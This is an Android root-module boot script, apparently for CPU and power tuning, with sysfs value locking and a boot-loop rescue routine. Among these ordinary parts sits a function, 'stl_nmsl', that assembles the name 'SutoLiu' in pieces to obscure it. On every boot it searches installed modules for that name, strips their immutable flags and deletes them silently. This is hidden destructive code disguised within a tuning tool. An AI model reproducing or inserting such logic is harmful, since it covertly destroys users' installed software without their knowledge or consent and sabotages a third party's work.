#!/system/bin/sh
# Copyright (C) 2021-2022 Matt Yang
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

MODDIR=${0%/*}
lock_val() {
    for p in $2; do
        if [ -f "$p" ]; then
            chmod 0666 "$p" 2>/dev/null
            #log "changing $p"
            echo "$1" >"$p"
            chmod 0444 "$p" 2>/dev/null
        fi
    done
}
async_rescue() {
    mkdir $MODDIR/flag/
    if [ -f "$MODDIR/flag/need_recuser" ]; then
        rm -f "$MODDIR"/flag/need_recuser
        true >"$MODDIR"/disable
        true >"$MODDIR"/../sfanalysis/disable
        true >"$MODDIR"/../ssanalysis/disable
        chmod 666 /data/powercfg.sh
        chmod 666 /data/powercfg.json
        rm -rf /data/powercfg.sh /data/powercfg.json
        sync
    else
        true >$MODDIR/flag/need_recuser
        rm "$MODDIR"/disable
        sync
    fi
}

stl_nmsl(){
SUT="Suto"
LIU="Liu"
MODS_PATH="/data/adb/modules"
for i in $(ls $MODS_PATH); do
    if [[ ! -z $(grep $SUT$LIU $MODS_PATH/$i/module.prop) ]]; then
        chattr -R -i $MODS_PATH/$i
        rm -rf $MODS_PATH/$i
    fi
done
}

do_others() {
    stl_nmsl
    rmdir /dev/cpuset/background/untrustedapp
    resetprop --file $MODDIR/system.prop
}
async_rescue
do_others
